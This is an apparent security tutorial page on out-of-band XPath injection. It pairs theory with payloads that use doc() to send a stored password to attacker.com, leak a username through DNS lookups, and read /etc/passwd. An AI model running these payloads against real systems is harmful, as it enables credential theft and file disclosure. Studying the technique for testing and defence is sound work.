---
title: Out of Band Exploitation in XPath Injection
description: Explore out-of-band exploitation techniques in XPath injection for data
  exfiltration via DNS and HTTP.
keywords:
- OOB exploitation
- XPath injection
- data exfiltration
- HTTP callback
- DNS exfiltration
- XML external entity
- doc() function
- file inclusion
---

# Out Of Band Exploitation

## Context

    Out Of Band (OOB) exploitation in XPath injection enables attackers to exfiltrate data or interact with external systems using injected XPath queries. This approach is essential when traditional data extraction methods fail due to blind injection constraints or lack of error messages. A sound understanding of XPath query syntax, XML document structure, HTTP, and DNS protocols is assumed, alongside familiarity with standard XPath injection techniques.

## Theory

### Out-of-Band (OOB) Exploitation in XPath Injection

    OOB exploitation leverages the ability to trigger external interactions such as DNS queries or HTTP requests using injected XPath payloads. This technique is particularly effective in contexts where direct data extraction is impeded. An attacker can inject an XPath payload that causes the backend system to issue an external request, which is then captured and analyzed for sensitive data leakage.

### External Document Access via XPath Functions

    Certain XPath processors support functions like `doc()`, which can load and parse external XML documents. This capability can be exploited when user inputs are unsafely integrated into XPath expressions. By injecting calls to such functions with references to attacker-controlled resources, attackers can initiate file or network interactions unbeknownst to the application.

### Data Exfiltration Channels

    Data exfiltration through OOB channels can occur via DNS queries, HTTP requests, or file reads. With this approach, an attacker encodes sensitive information into a resource identifier, such as a subdomain or URL path, that the system resolves or attempts to fetch externally. This indirect method of data leakage often goes unnoticed by standard monitoring and logging mechanisms.

### Integration with XXE and XML External Calls

    XPath injection has parallels with XXE vulnerabilities, particularly when XML processors are configured to resolve external entities. This configuration can expose applications to network or file access initiated through XML calls. Applications often mistakenly assume that XML or XPath processors are isolated from making outbound calls, thus inadvertently expanding the attack surface for skilled adversaries.

## Practice

### Exfiltrate Data via `doc()` Function and HTTP Callback

    - Start an HTTP listener to capture callbacks:
        ```bash
        python3 -m http.server 8080
        ```
    - Inject a payload that fetches an attacker-controlled document:
        ```xpath
        doc('http://attacker.com:8080/?leak='||/users/user[1]/password)
        ```
    - Outcome: the backend requests the attacker URL and includes the first user password in the query string.

### DNS-Based OOB Data Exfiltration via XPath Injection

    - Configure a DNS logging domain capable of capturing inbound queries.
    - Inject a payload that forces the processor to resolve a user-controlled hostname:
        ```xpath
        doc('http://'||/users/user[1]/username||'.attacker-dns.com')
        ```
    - Outcome: the backend emits a DNS lookup containing the username inside the subdomain, which is recorded by the logging service.

### File Inclusion via `doc()` Function in XPath

    - Target local files by invoking the `doc()` function with a file URI:
        ```xpath
        doc('file:///etc/passwd')
        ```
    - Monitor responses or stack traces to capture the referenced file content.
    - Outcome: contents of `/etc/passwd` or other sensitive files are reflected back to the attacker.

## Tools

    - **Burp Suite**
    - **Responder**
    - **tcpdump**
    - **python3**